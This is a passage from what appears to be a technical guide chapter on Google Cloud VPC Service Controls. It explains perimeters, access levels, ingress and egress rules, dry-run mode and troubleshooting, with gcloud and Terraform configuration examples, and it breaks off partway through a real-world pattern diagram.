# Chapter 43 — VPC Service Controls

---

## Table of Contents

- [Overview](#overview)
- [Part 1: VPC Service Controls Fundamentals](#part-1--vpc-service-controls-fundamentals)
- [Part 2: Service Perimeters](#part-2--service-perimeters)
- [Part 3: Access Levels](#part-3--access-levels)
- [Part 4: Ingress & Egress Rules](#part-4--ingress--egress-rules)
- [Part 5: Perimeter Bridges](#part-5--perimeter-bridges)
- [Part 6: Dry-Run Mode](#part-6--dry-run-mode)
- [Part 7: Supported Services](#part-7--supported-services)
- [Part 8: VPC Accessible Services](#part-8--vpc-accessible-services)
- [Part 9: Access Context Manager](#part-9--access-context-manager)
- [Part 10: Troubleshooting VPC-SC Violations](#part-10--troubleshooting-vpc-sc-violations)
- [Part 11: Integration with Other Services](#part-11--integration-with-other-services)
- [Part 12: IAM & Organization Setup](#part-12--iam--organization-setup)
- [Part 13: Monitoring & Audit Logging](#part-13--monitoring--audit-logging)
- [Part 14: Terraform & gcloud CLI Reference](#part-14--terraform--gcloud-cli-reference)
- [Part 15: Real-World Patterns](#part-15--real-world-patterns)
- [Quick Reference](#quick-reference)
- [What's Next?](#whats-next)

---

## Overview

VPC Service Controls (VPC-SC) create security perimeters around GCP resources to prevent data exfiltration. Even if an attacker compromises credentials, they cannot copy data out of the perimeter. VPC-SC works at the API level — it restricts which networks, identities, and projects can access services inside the perimeter, regardless of IAM permissions.

---

## Part 1 — VPC Service Controls Fundamentals

### What Are VPC Service Controls?

```
┌─────────────────────────────────────────────────────────────────┐
│              VPC SERVICE CONTROLS OVERVIEW                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│  Problem: IAM controls WHO can access data.                      │
│  But it doesn't control WHERE data can go.                      │
│                                                                   │
│  Scenario:                                                        │
│  An attacker steals a service account key with                   │
│  roles/storage.admin. They can:                                  │
│  ✓ Read all data from your bucket (IAM allows it)               │
│  ✓ Copy data to THEIR OWN project (IAM allows it)              │
│  ✓ Exfiltrate data outside your organization                    │
│                                                                   │
│  VPC Service Controls BLOCK this:                                │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │                                                           │   │
│  │  ┌─ Service Perimeter ──────────────────────────────┐   │   │
│  │  │                                                   │   │   │
│  │  │  ┌──────────┐  ┌──────────┐  ┌──────────────┐  │   │   │
│  │  │  │ BigQuery │  │ Cloud    │  │ Cloud SQL    │  │   │   │
│  │  │  │ dataset  │  │ Storage  │  │ database     │  │   │   │
│  │  │  └──────────┘  └──────────┘  └──────────────┘  │   │   │
│  │  │                                                   │   │   │
│  │  │  ✓ Access from inside perimeter (approved VPC)   │   │   │
│  │  │  ✗ Access from outside perimeter (any network)   │   │   │
│  │  │  ✗ Copy data to another project                   │   │   │
│  │  │  ✗ Copy data from external sources in             │   │   │
│  │  │                                                   │   │   │
│  │  └───────────────────────────────────────────────────┘   │   │
│  │                                                           │   │
│  │  Even with valid IAM credentials, requests from          │   │
│  │  outside the perimeter are BLOCKED.                      │   │
│  │                                                           │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                   │
└─────────────────────────────────────────────────────────────────┘
```

### Cross-Cloud Comparison

| Feature | GCP VPC-SC | AWS (No Direct Equivalent) | Azure Private Link + Policies |
|---------|-----------|---------------------------|-------------------------------|
| Service | VPC Service Controls | VPC Endpoints + SCPs + S3 policies | Private Endpoints + Service Endpoint Policies |
| Scope | API-level perimeter | Endpoint + IAM policies | Network + policy |
| Data exfiltration prevention | Built-in (perimeter blocks all) | Requires custom SCP + VPC endpoint policies | Partial (per-service config) |
| Dry-run mode | Yes | No | No |
| Perimeter bridges | Yes (cross-project sharing) | N/A | N/A |
| Access levels | IP, device, identity | N/A (use SCPs) | Conditional Access |
| Supported services | 40+ GCP services | Per-service endpoint policy | Per-service config |
| Organization-wide | Yes (Access Context Manager) | SCPs at org level | Azure Policy |

### Key Insight: VPC-SC vs IAM

```
┌──────────────────────────────────────────────────────────────┐
│         VPC-SC vs IAM                                          │
├──────────────────────────────────────────────────────────────┤
│                                                                │
│  IAM answers:  "Does this identity have PERMISSION?"          │
│  VPC-SC answers: "Is this request from an ALLOWED CONTEXT?"  │
│                                                                │
│  Both must pass for access to succeed:                        │
│                                                                │
│  Request → IAM check → VPC-SC check → Resource               │
│            (who?)       (from where?)                         │
│                                                                │
│  Example:                                                      │
│  • SA has roles/bigquery.dataViewer ← IAM allows             │
│  • Request comes from attacker's laptop ← VPC-SC DENIES     │
│  → Access blocked despite valid credentials                  │
│                                                                │
│  • SA has roles/bigquery.dataViewer ← IAM allows             │
│  • Request comes from approved VPC ← VPC-SC allows           │
│  → Access granted                                             │
│                                                                │
└──────────────────────────────────────────────────────────────┘
```

---

## Part 2 — Service Perimeters

### Perimeter Structure

```
┌──────────────────────────────────────────────────────────────┐
│         SERVICE PERIMETER                                      │
├──────────────────────────────────────────────────────────────┤
│                                                                │
│  A perimeter defines:                                          │
│                                                                │
│  ┌──────────────────────────────────────────────────────┐    │
│  │  Perimeter: "prod-data-perimeter"                    │    │
│  │                                                      │    │
│  │  Projects inside (protected):                        │    │
│  │  ├── project-data-prod                               │    │
│  │  ├── project-analytics-prod                          │    │
│  │  └── project-ml-prod                                 │    │
│  │                                                      │    │
│  │  Restricted services:                                │    │
│  │  ├── bigquery.googleapis.com                         │    │
│  │  ├── storage.googleapis.com                          │    │
│  │  ├── sqladmin.googleapis.com                         │    │
│  │  └── secretmanager.googleapis.com                    │    │
│  │                                                      │    │
│  │  Access levels (who can cross the perimeter):        │    │
│  │  ├── "corp-network" (IP range 203.0.113.0/24)       │    │
│  │  └── "trusted-devices" (device policy)               │    │
│  │                                                      │    │
│  │  Ingress rules (specific allowed inbound access):    │    │
│  │  └── CI/CD SA from project-cicd can write to GCS    │    │
│  │                                                      │    │
│  │  Egress rules (specific allowed outbound access):    │    │
│  │  └── ML SA can read from public dataset project     │    │
│  │                                                      │    │
│  └──────────────────────────────────────────────────────┘    │
│                                                                │
│  What's blocked:                                               │
│  ✗ Accessing restricted services from outside perimeter     │
│  ✗ Copying data from inside to outside the perimeter        │
│  ✗ Accessing perimeter resources from the Cloud Console     │
│    (unless Console IP is in access level)                    │
│  ✗ gsutil / gcloud from developer laptops                   │
│    (unless laptop IP is in access level)                    │
│                                                                │
└──────────────────────────────────────────────────────────────┘
```

### Perimeter Types

| Type | Description | Use Case |
|------|-------------|----------|
| **Regular** | Standard security perimeter around projects | Protecting production data |
| **Perimeter bridge** | Allows communication between two perimeters | Cross-team data sharing |
| **Dry-run** | Logs violations without blocking (shadow mode) | Testing before enforcement |

### Creating a Service Perimeter

```bash
# Step 1: Create an access policy (org-level, one per org)
gcloud access-context-manager policies create \
    --organization=ORG_ID \
    --title="Organization Access Policy"

# Step 2: Create an access level
gcloud access-context-manager levels create corp-network \
    --policy=POLICY_ID \
    --title="Corporate Network" \
    --basic-level-spec=corp-network.yaml

# corp-network.yaml:
# - ipSubnetworks:
#   - 203.0.113.0/24
#   - 198.51.100.0/24

# Step 3: Create the service perimeter
gcloud access-context-manager perimeters create prod-data \
    --policy=POLICY_ID \
    --title="Production Data Perimeter" \
    --resources="projects/111111111,projects/222222222" \
    --restricted-services="bigquery.googleapis.com,storage.googleapis.com" \
    --access-levels="accessPolicies/POLICY_ID/accessLevels/corp-network"
```

---

## Part 3 — Access Levels

### What Are Access Levels?

```
┌──────────────────────────────────────────────────────────────┐
│         ACCESS LEVELS                                          │
├──────────────────────────────────────────────────────────────┤
│                                                                │
│  Access levels define CONDITIONS under which requests can    │
│  cross the perimeter boundary:                                │
│                                                                │
│  ┌──────────────────────────────────────────────────────┐    │
│  │  Condition types:                                     │    │
│  │                                                      │    │
│  │  IP Subnetworks:                                      │    │
│  │  • Corporate office IP ranges                        │    │
│  │  • VPN egress IPs                                     │    │
│  │  • Cloud NAT IPs                                      │    │
│  │                                                      │    │
│  │  Device Policy (BeyondCorp):                          │    │
│  │  • Managed devices only                              │    │
│  │  • Screen lock required                              │    │
│  │  • Disk encryption required                          │    │
│  │  • OS version requirements                           │    │
│  │                                                      │    │
│  │  Members / Identities:                                │    │
│  │  • Specific users or service accounts                │    │
│  │  • Useful for CI/CD pipelines                        │    │
│  │                                                      │    │
│  │  Regions:                                             │    │
│  │  • Restrict to specific geographic regions           │    │
│  │                                                      │    │
│  │  Combining conditions (AND/OR):                       │    │
│  │  • All conditions in a level are ANDed               │    │
│  │  • Multiple levels on a perimeter are ORed           │    │
│  └──────────────────────────────────────────────────────┘    │
│                                                                │
└──────────────────────────────────────────────────────────────┘
```

### Creating Access Levels

```bash
# IP-based access level
cat > ip-level.yaml << 'EOF'
- ipSubnetworks:
  - 203.0.113.0/24
  - 198.51.100.0/24
EOF

gcloud access-context-manager levels create corp-network \
    --policy=POLICY_ID \
    --title="Corporate Network" \
    --basic-level-spec=ip-level.yaml

# Device-based access level
cat > device-level.yaml << 'EOF'
- devicePolicy:
    requireScreenlock: true
    requireAdminApproval: true
    allowedEncryptionStatuses:
      - ENCRYPTED
    allowedDeviceManagementLevels:
      - COMPLETE
    osConstraints:
      - osType: DESKTOP_CHROME_OS
      - osType: DESKTOP_WINDOWS
        minimumVersion: "10.0.0"
      - osType: DESKTOP_MAC
        minimumVersion: "12.0.0"
EOF

gcloud access-context-manager levels create managed-devices \
    --policy=POLICY_ID \
    --title="Managed Devices" \
    --basic-level-spec=device-level.yaml

# Combined access level (IP AND member)
cat > combined-level.yaml << 'EOF'
- ipSubnetworks:
  - 203.0.113.0/24
  members:
  - serviceAccount:cicd@my-project.iam.gserviceaccount.com
EOF

gcloud access-context-manager levels create cicd-access \
    --policy=POLICY_ID \
    --title="CI/CD Access" \
    --basic-level-spec=combined-level.yaml

# Custom access level (CEL expression)
gcloud access-context-manager levels create custom-level \
    --policy=POLICY_ID \
    --title="Custom Level" \
    --custom-level-spec=custom.yaml

# custom.yaml:
# expression: "origin.region_code in ['US', 'CA'] && request.auth.claims.email.endsWith('@example.com')"
```

---

## Part 4 — Ingress & Egress Rules

### Ingress Rules

```
┌──────────────────────────────────────────────────────────────┐
│         INGRESS RULES                                          │
├──────────────────────────────────────────────────────────────┤
│                                                                │
│  Ingress rules allow specific EXTERNAL access INTO           │
│  the perimeter (more granular than access levels):           │
│                                                                │
│  ┌──────────────────────────────────────────────────────┐    │
│  │                                                      │    │
│  │  OUTSIDE perimeter          INSIDE perimeter         │    │
│  │  ┌──────────────┐          ┌──────────────┐         │    │
│  │  │ CI/CD SA     │──────────│ GCS bucket   │         │    │
│  │  │ (project-    │ ingress  │ (project-    │         │    │
│  │  │  cicd)       │ rule     │  data-prod)  │         │    │
│  │  └──────────────┘ allows   └──────────────┘         │    │
│  │                                                      │    │
│  │  Ingress rule:                                       │    │
│  │  FROM: serviceAccount:cicd@project-cicd.iam...      │    │
│  │  TO:   storage.googleapis.com in project-data-prod  │    │
│  │  METHOD: google.storage.objects.create (write only) │    │
│  │                                                      │    │
│  └──────────────────────────────────────────────────────┘    │
│                                                                │
└──────────────────────────────────────────────────────────────┘
```

### Egress Rules

```
┌──────────────────────────────────────────────────────────────┐
│         EGRESS RULES                                           │
├──────────────────────────────────────────────────────────────┤
│                                                                │
│  Egress rules allow access FROM inside the perimeter         │
│  TO external resources:                                       │
│                                                                │
│  ┌──────────────────────────────────────────────────────┐    │
│  │                                                      │    │
│  │  INSIDE perimeter          OUTSIDE perimeter         │    │
│  │  ┌──────────────┐          ┌──────────────┐         │    │
│  │  │ ML training  │──────────│ Public       │         │    │
│  │  │ SA (project- │ egress   │ dataset      │         │    │
│  │  │  ml-prod)    │ rule     │ (bigquery-   │         │    │
│  │  └──────────────┘ allows   │  public-data)│         │    │
│  │                            └──────────────┘         │    │
│  │                                                      │    │
│  │  Egress rule:                                        │    │
│  │  FROM: serviceAccount:ml@project-ml-prod.iam...     │    │
│  │  TO:   bigquery.googleapis.com in bigquery-public   │    │
│  │  METHOD: bigquery.tables.getData (read only)        │    │
│  │                                                      │    │
│  └──────────────────────────────────────────────────────┘    │
│                                                                │
└──────────────────────────────────────────────────────────────┘
```

### Ingress/Egress Rule Format

```yaml
# Ingress policy (YAML format for gcloud)
- ingressFrom:
    identityType: ANY_IDENTITY  # or SPECIFIC_IDENTITIES
    # identities:
    #   - serviceAccount:cicd@project.iam.gserviceaccount.com
    sources:
      - accessLevel: accessPolicies/POLICY/accessLevels/corp-network
      # OR
      # - resource: projects/123456789
  ingressTo:
    operations:
      - serviceName: storage.googleapis.com
        methodSelectors:
          - method: google.storage.objects.create
          - method: google.storage.objects.get
    resources:
      - projects/111111111  # target project inside perimeter

# Egress policy (YAML format for gcloud)
- egressFrom:
    identityType: ANY_IDENTITY
    # identities:
    #   - serviceAccount:ml@project.iam.gserviceaccount.com
  egressTo:
    operations:
      - serviceName: bigquery.googleapis.com
        methodSelectors:
          - method: "*"  # all methods
    resources:
      - projects/999999999  # external project
```

---

## Part 5 — Perimeter Bridges

### What Are Perimeter Bridges?

```
┌──────────────────────────────────────────────────────────────┐
│         PERIMETER BRIDGES                                      │
├──────────────────────────────────────────────────────────────┤
│                                                                │
│  Bridges allow two perimeters to share data with each other  │
│  without opening access to the outside world:                │
│                                                                │
│  Without bridge:                                               │
│  ┌──── Perimeter A ────┐  ✗  ┌──── Perimeter B ────┐       │
│  │ project-data-team-a  │ ──► │ project-data-team-b  │       │
│  └──────────────────────┘     └──────────────────────┘       │
│  (blocked — different perimeters)                             │
│                                                                │
│  With bridge:                                                  │
│  ┌──── Perimeter A ────┐  ✓  ┌──── Perimeter B ────┐       │
│  │ project-data-team-a  │ ◄─► │ project-data-team-b  │       │
│  └──────────────────────┘     └──────────────────────┘       │
│           └──── Bridge ────────────┘                          │
│  (allowed — bridge connects both perimeters)                 │
│                                                                │
│  Bridge properties:                                            │
│  • Bidirectional (both sides can access each other)          │
│  • Only for restricted services common to both perimeters    │
│  • Does NOT open access to outside — only between the two   │
│  • Each perimeter retains its own access levels              │
│                                                                │
│  Alternative: Use ingress/egress rules instead of bridges    │
│  for more fine-grained control (one-directional, specific    │
│  services/methods).                                           │
│                                                                │
└──────────────────────────────────────────────────────────────┘
```

```bash
# Create a perimeter bridge
gcloud access-context-manager perimeters create team-bridge \
    --policy=POLICY_ID \
    --title="Team A ↔ Team B Bridge" \
    --perimeter-type=bridge \
    --resources="projects/111111111,projects/222222222"
```

---

## Part 6 — Dry-Run Mode

### Testing with Dry Run

```
┌──────────────────────────────────────────────────────────────┐
│         DRY-RUN MODE                                           │
├──────────────────────────────────────────────────────────────┤
│                                                                │
│  Dry-run lets you test VPC-SC policies WITHOUT blocking      │
│  any requests. Violations are LOGGED but not ENFORCED.       │
│                                                                │
│  ┌──────────────────────────────────────────────────────┐    │
│  │  Workflow:                                            │    │
│  │                                                      │    │
│  │  1. Create perimeter in DRY RUN mode                 │    │
│  │  2. Wait 1-2 weeks                                   │    │
│  │  3. Review violation logs in Cloud Logging            │    │
│  │  4. Adjust access levels / ingress / egress rules    │    │
│  │  5. Repeat until no unexpected violations            │    │
│  │  6. Convert to ENFORCED mode                         │    │
│  │                                                      │    │
│  │  Log filter for dry-run violations:                  │    │
│  │  protoPayload.metadata.dryRun=true                   │    │
│  │  protoPayload.metadata.violationReason exists        │    │
│  └──────────────────────────────────────────────────────┘    │
│                                                                │
│  You can also run dry-run ALONGSIDE an enforced perimeter:  │
│  • Enforced perimeter: current policy                       │
│  • Dry-run overlay: proposed changes                        │
│  → See what the new policy would block before applying      │
│                                                                │
└──────────────────────────────────────────────────────────────┘
```

```bash
# Create a dry-run perimeter
gcloud access-context-manager perimeters dry-run create prod-data \
    --policy=POLICY_ID \
    --resources="projects/111111111,projects/222222222" \
    --restricted-services="bigquery.googleapis.com,storage.googleapis.com"

# View dry-run violations in Cloud Logging
gcloud logging read 'protoPayload.metadata.@type="type.googleapis.com/google.cloud.audit.VpcServiceControlAuditMetadata" AND protoPayload.metadata.dryRun=true' \
    --project=my-project \
    --limit=50

# Promote dry-run to enforced
gcloud access-context-manager perimeters dry-run enforce prod-data \
    --policy=POLICY_ID
```

---

## Part 7 — Supported Services

### Commonly Protected Services

| Service | API | Common Use |
|---------|-----|-----------|
| Cloud Storage | `storage.googleapis.com` | Object storage |
| BigQuery | `bigquery.googleapis.com` | Data warehouse |
| Cloud SQL | `sqladmin.googleapis.com` | Relational databases |
| Cloud Spanner | `spanner.googleapis.com` | Global databases |
| Bigtable | `bigtable.googleapis.com` | NoSQL |
| Dataflow | `dataflow.googleapis.com` | Data processing |
| Dataproc | `dataproc.googleapis.com` | Spark/Hadoop |
| Pub/Sub | `pubsub.googleapis.com` | Messaging |
| Cloud KMS | `cloudkms.googleapis.com` | Key management |
| Secret Manager | `secretmanager.googleapis.com` | Secrets |
| Compute Engine | `compute.googleapis.com` | Virtual machines |
| GKE | `container.googleapis.com` | Kubernetes |
| Cloud Functions | `cloudfunctions.googleapis.com` | Serverless |
| Cloud Run | `run.googleapis.com` | Containers |
| Artifact Registry | `artifactregistry.googleapis.com` | Container images |
| Cloud Logging | `logging.googleapis.com` | Logs |
| Cloud Monitoring | `monitoring.googleapis.com` | Metrics |

> Full list: 40+ services. Check documentation for updates.

---

## Part 8 — VPC Accessible Services

### Restricting VPC-Internal Access

```
┌──────────────────────────────────────────────────────────────┐
│         VPC ACCESSIBLE SERVICES                                │
├──────────────────────────────────────────────────────────────┤
│                                                                │
│  By default, VMs inside a perimeter can access ALL Google    │
│  APIs (not just restricted ones). VPC Accessible Services    │
│  limits which APIs are reachable from VPC networks inside    │
│  the perimeter.                                               │
│                                                                │
│  Without VPC Accessible Services:                              │
│  ┌──────────────────────────────────────────────────────┐    │
│  │  VM in perimeter                                     │    │
│  │  ├── storage.googleapis.com      ✓ (restricted)     │    │
│  │  ├── bigquery.googleapis.com     ✓ (restricted)     │    │
│  │  ├── translate.googleapis.com    ✓ (NOT restricted) │    │
│  │  └── ANY Google API              ✓ (reachable)      │    │
│  └──────────────────────────────────────────────────────┘    │
│  → Data could leak via unrestricted APIs                     │
│                                                                │
│  With VPC Accessible Services:                                 │
│  ┌──────────────────────────────────────────────────────┐    │
│  │  VM in perimeter                                     │    │
│  │  ├── storage.googleapis.com      ✓ (allowed)        │    │
│  │  ├── bigquery.googleapis.com     ✓ (allowed)        │    │
│  │  ├── translate.googleapis.com    ✗ (blocked)        │    │
│  │  └── Other Google APIs           ✗ (blocked)        │    │
│  └──────────────────────────────────────────────────────┘    │
│  → Only specified APIs are reachable from VPC                │
│                                                                │
└──────────────────────────────────────────────────────────────┘
```

```bash
# Set VPC accessible services
gcloud access-context-manager perimeters update prod-data \
    --policy=POLICY_ID \
    --enable-vpc-accessible-services \
    --vpc-allowed-services="storage.googleapis.com,bigquery.googleapis.com,logging.googleapis.com"
```

---

## Part 9 — Access Context Manager

### Access Context Manager Overview

```
┌──────────────────────────────────────────────────────────────┐
│         ACCESS CONTEXT MANAGER                                 │
├──────────────────────────────────────────────────────────────┤
│                                                                │
│  Access Context Manager is the org-level service that         │
│  manages access policies, access levels, and service          │
│  perimeters:                                                  │
│                                                                │
│  Organization                                                  │
│  └── Access Policy (one per org)                              │
│      ├── Access Levels                                        │
│      │   ├── corp-network (IP-based)                         │
│      │   ├── managed-devices (device-based)                  │
│      │   └── trusted-users (identity-based)                  │
│      │                                                        │
│      └── Service Perimeters                                   │
│          ├── prod-data (enforced)                             │
│          ├── staging-data (dry-run)                           │
│          └── team-bridge (bridge)                             │
│                                                                │
│  Access levels can also be used with:                          │
│  • IAM Conditions (grant role only from corp network)        │
│  • Identity-Aware Proxy (Part 45)                            │
│  • BeyondCorp Enterprise                                     │
│                                                                │
└──────────────────────────────────────────────────────────────┘
```

---

## Part 10 — Troubleshooting VPC-SC Violations

### Reading Violation Logs

```
┌──────────────────────────────────────────────────────────────┐
│         TROUBLESHOOTING VPC-SC                                 │
├──────────────────────────────────────────────────────────────┤
│                                                                │
│  When VPC-SC blocks a request, you see:                       │
│  • Error 403 with "Request is prohibited by                  │
│    organization's policy"                                     │
│  • Audit log with violationReason field                      │
│                                                                │
│  Common violation reasons:                                     │
│  ┌──────────────────────────────────────────────────────┐    │
│  │ RESOURCES_NOT_IN_SAME_SERVICE_PERIMETER              │    │
│  │ → Source and destination projects are in different    │    │
│  │   perimeters (or one is outside all perimeters)     │    │
│  │                                                      │    │
│  │ SERVICE_NOT_ALLOWED_FROM_VPC                         │    │
│  │ → VPC Accessible Services blocks this API           │    │
│  │                                                      │    │
│  │ NO_MATCHING_ACCESS_LEVEL                             │    │
│  │ → Request source doesn't match any access level     │    │
│  │                                                      │    │
│  │ NETWORK_NOT_IN_SAME_SERVICE_PERIMETER                │    │
│  │ → VPC network is not in the perimeter               │    │
│  └──────────────────────────────────────────────────────┘    │
│                                                                │
│  Debugging steps:                                              │
│  1. Check audit log for the violation reason                 │
│  2. Verify the project is inside the perimeter               │
│  3. Verify the service is in restricted-services             │
│  4. Check access levels (IP, device, identity)               │
│  5. Check ingress/egress rules                               │
│  6. Use dry-run to test proposed changes                     │
│                                                                │
└──────────────────────────────────────────────────────────────┘
```

```bash
# Find VPC-SC violations in audit logs
gcloud logging read '
  protoPayload.status.code=7 AND
  protoPayload.metadata.@type="type.googleapis.com/google.cloud.audit.VpcServiceControlAuditMetadata"
' --project=my-project --limit=20

# VPC-SC troubleshooter (via Console)
# Console → Security → VPC Service Controls → Troubleshooter
# Paste the unique ID from the error message
```

---

## Part 11 — Integration with Other Services

### Private Google Access + VPC-SC

```
┌──────────────────────────────────────────────────────────────┐
│         VPC-SC + PRIVATE GOOGLE ACCESS                        │
├──────────────────────────────────────────────────────────────┤
│                                                                │
│  For VMs without public IPs to access Google APIs inside     │
│  the perimeter:                                               │
│                                                                │
│  1. Enable Private Google Access on the subnet               │
│  2. Configure DNS to resolve *.googleapis.com to              │
│     restricted.googleapis.com (199.36.153.4/30)              │
│     OR private.googleapis.com (199.36.153.8/30)              │
│                                                                │
│  restricted.googleapis.com:                                    │
│  • Supports VPC-SC enforcement                               │
│  • Only works for VPC-SC-supported services                  │
│  • Recommended for perimeter-protected projects              │
│                                                                │
│  private.googleapis.com:                                       │
│  • Does NOT support VPC-SC enforcement                       │
│  • Supports all Google APIs                                  │
│  • Use for services not supported by VPC-SC                  │
│                                                                │
└──────────────────────────────────────────────────────────────┘
```

---

## Part 12 — IAM & Organization Setup

### IAM Roles

| Role | Description |
|------|-------------|
| `roles/accesscontextmanager.policyAdmin` | Full management of policies, levels, perimeters |
| `roles/accesscontextmanager.policyEditor` | Edit policies (no delete) |
| `roles/accesscontextmanager.policyReader` | View policies |
| `roles/accesscontextmanager.gcpAccessAdmin` | Manage GCP-specific access bindings |

```bash
# Grant VPC-SC admin
gcloud organizations add-iam-policy-binding ORG_ID \
    --member="group:security-team@example.com" \
    --role="roles/accesscontextmanager.policyAdmin"

# Grant VPC-SC reader (for troubleshooting)
gcloud organizations add-iam-policy-binding ORG_ID \
    --member="group:devops@example.com" \
    --role="roles/accesscontextmanager.policyReader"
```

---

## Part 13 — Monitoring & Audit Logging

### VPC-SC Audit Logs

```bash
# All VPC-SC violations
gcloud logging read '
  protoPayload.metadata.@type="type.googleapis.com/google.cloud.audit.VpcServiceControlAuditMetadata"
' --project=my-project --limit=20

# Create alert for VPC-SC violations
gcloud logging metrics create vpc-sc-violations \
    --description="VPC Service Controls violations" \
    --log-filter='protoPayload.status.code=7 AND protoPayload.metadata.@type="type.googleapis.com/google.cloud.audit.VpcServiceControlAuditMetadata"'

# Monitor dry-run violations
gcloud logging read '
  protoPayload.metadata.dryRun=true AND
  protoPayload.metadata.@type="type.googleapis.com/google.cloud.audit.VpcServiceControlAuditMetadata"
' --project=my-project --limit=50
```

---

## Part 14 — Terraform & gcloud CLI Reference

### Terraform

```hcl
# ─── Access Policy (one per org) ─────────────────────────────
resource "google_access_context_manager_access_policy" "org_policy" {
  parent = "organizations/${var.org_id}"
  title  = "Organization Access Policy"
}

# ─── Access Level — Corporate Network ────────────────────────
resource "google_access_context_manager_access_level" "corp_network" {
  parent = "accessPolicies/${google_access_context_manager_access_policy.org_policy.name}"
  name   = "accessPolicies/${google_access_context_manager_access_policy.org_policy.name}/accessLevels/corp_network"
  title  = "Corporate Network"

  basic {
    conditions {
      ip_subnetworks = [
        "203.0.113.0/24",
        "198.51.100.0/24",
      ]
    }
  }
}

# ─── Access Level — Managed Devices ──────────────────────────
resource "google_access_context_manager_access_level" "managed_devices" {
  parent = "accessPolicies/${google_access_context_manager_access_policy.org_policy.name}"
  name   = "accessPolicies/${google_access_context_manager_access_policy.org_policy.name}/accessLevels/managed_devices"
  title  = "Managed Devices"

  basic {
    conditions {
      device_policy {
        require_screen_lock    = true
        require_admin_approval = true
        allowed_encryption_statuses = ["ENCRYPTED"]
      }
    }
  }
}

# ─── Service Perimeter ───────────────────────────────────────
resource "google_access_context_manager_service_perimeter" "prod_data" {
  parent = "accessPolicies/${google_access_context_manager_access_policy.org_policy.name}"
  name   = "accessPolicies/${google_access_context_manager_access_policy.org_policy.name}/servicePerimeters/prod_data"
  title  = "Production Data Perimeter"

  status {
    resources = [
      "projects/${data.google_project.data_prod.number}",
      "projects/${data.google_project.analytics_prod.number}",
    ]

    restricted_services = [
      "bigquery.googleapis.com",
      "storage.googleapis.com",
      "sqladmin.googleapis.com",
      "secretmanager.googleapis.com",
    ]

    access_levels = [
      google_access_context_manager_access_level.corp_network.name,
    ]

    # Ingress rule: allow CI/CD to write to GCS
    ingress_policies {
      ingress_from {
        identity_type = "ANY_IDENTITY"
        sources {
          resource = "projects/${data.google_project.cicd.number}"
        }
      }
      ingress_to {
        resources = ["projects/${data.google_project.data_prod.number}"]
        operations {
          service_name = "storage.googleapis.com"
          method_selectors {
            method = "google.storage.objects.create"
          }
        }
      }
    }

    # Egress rule: allow ML to read public datasets
    egress_policies {
      egress_from {
        identity_type = "ANY_IDENTITY"
      }
      egress_to {
        resources = ["projects/bigquery-public-data"]
        operations {
          service_name = "bigquery.googleapis.com"
          method_selectors {
            method = "*"
          }
        }
      }
    }

    # VPC accessible services
    vpc_accessible_services {
      enable_restriction = true
      allowed_services = [
        "storage.googleapis.com",
        "bigquery.googleapis.com",
        "logging.googleapis.com",
        "monitoring.googleapis.com",
      ]
    }
  }
}

# ─── Perimeter Bridge ────────────────────────────────────────
resource "google_access_context_manager_service_perimeter" "bridge" {
  parent         = "accessPolicies/${google_access_context_manager_access_policy.org_policy.name}"
  name           = "accessPolicies/${google_access_context_manager_access_policy.org_policy.name}/servicePerimeters/team_bridge"
  title          = "Team A - Team B Bridge"
  perimeter_type = "PERIMETER_TYPE_BRIDGE"

  status {
    resources = [
      "projects/${data.google_project.team_a.number}",
      "projects/${data.google_project.team_b.number}",
    ]
  }
}
```

### gcloud CLI Reference

```bash
# ═══════════════════════════════════════════════════════════════
# ACCESS POLICY
# ═══════════════════════════════════════════════════════════════

# Create access policy
gcloud access-context-manager policies create \
    --organization=ORG_ID --title="My Policy"

# List policies
gcloud access-context-manager policies list --organization=ORG_ID

# ═══════════════════════════════════════════════════════════════
# ACCESS LEVELS
# ═══════════════════════════════════════════════════════════════

# Create IP-based level
gcloud access-context-manager levels create LEVEL_NAME \
    --policy=POLICY_ID --title="Title" \
    --basic-level-spec=SPEC_FILE.yaml

# List levels
gcloud access-context-manager levels list --policy=POLICY_ID

# Update level
gcloud access-context-manager levels update LEVEL_NAME \
    --policy=POLICY_ID --basic-level-spec=NEW_SPEC.yaml

# Delete level
gcloud access-context-manager levels delete LEVEL_NAME --policy=POLICY_ID

# ═══════════════════════════════════════════════════════════════
# SERVICE PERIMETERS
# ═══════════════════════════════════════════════════════════════

# Create perimeter
gcloud access-context-manager perimeters create PERIMETER_NAME \
    --policy=POLICY_ID \
    --title="Title" \
    --resources="projects/NUM1,projects/NUM2" \
    --restricted-services="SERVICE1,SERVICE2" \
    --access-levels="accessPolicies/POLICY/accessLevels/LEVEL"

# Update perimeter
gcloud access-context-manager perimeters update PERIMETER_NAME \
    --policy=POLICY_ID \
    --add-resources="projects/NUM3" \
    --add-restricted-services="SERVICE3"

# Set ingress policy
gcloud access-context-manager perimeters update PERIMETER_NAME \
    --policy=POLICY_ID \
    --set-ingress-policies=ingress.yaml

# Set egress policy
gcloud access-context-manager perimeters update PERIMETER_NAME \
    --policy=POLICY_ID \
    --set-egress-policies=egress.yaml

# Delete perimeter
gcloud access-context-manager perimeters delete PERIMETER_NAME \
    --policy=POLICY_ID

# ═══════════════════════════════════════════════════════════════
# DRY RUN
# ═══════════════════════════════════════════════════════════════

# Create dry-run config
gcloud access-context-manager perimeters dry-run create PERIMETER \
    --policy=POLICY_ID --resources=... --restricted-services=...

# Enforce dry-run
gcloud access-context-manager perimeters dry-run enforce PERIMETER \
    --policy=POLICY_ID

# Delete dry-run config
gcloud access-context-manager perimeters dry-run delete PERIMETER \
    --policy=POLICY_ID
```

---

## Part 15 — Real-World Patterns

### Pattern 1: Data Lake Protection

```
┌──────────────────────────────────────────────────────────────────────┐
│     PATTERN 1: DATA LAKE PERIMETER                                    │
├──────────────────────────────────────────────────────────────────────┤
│                                                                        │
│  ┌─── Perimeter: "data-lake" ─────────────────────────────────┐     │
│  │                                                             │     │
│  │  Projects:                                                  │     │
│  │  ├── data-ingestion (GCS raw data)                         │     │
│  │  ├── data-processing (Dataflow, Dataproc)                  │     │
│  │  ├── data-warehouse (BigQuery)                              │     │
│  │  └── data-ml (Vertex AI, notebooks)                        │     │
│  │                                                             │     │
│  │  Restricted services:                                       │     │
│  │  storage, bigquery, dataflow, dataproc, aiplatform          │     │
│  │                                                             │     │
│  │  Access levels:                                             │     │
│  │  ├── corp-network (office IPs)                             │     │
│  │  └── managed-devices (BeyondCorp)                          │     │
│  │                                                             │     │
│  │  Ingress rules:                                             │     │
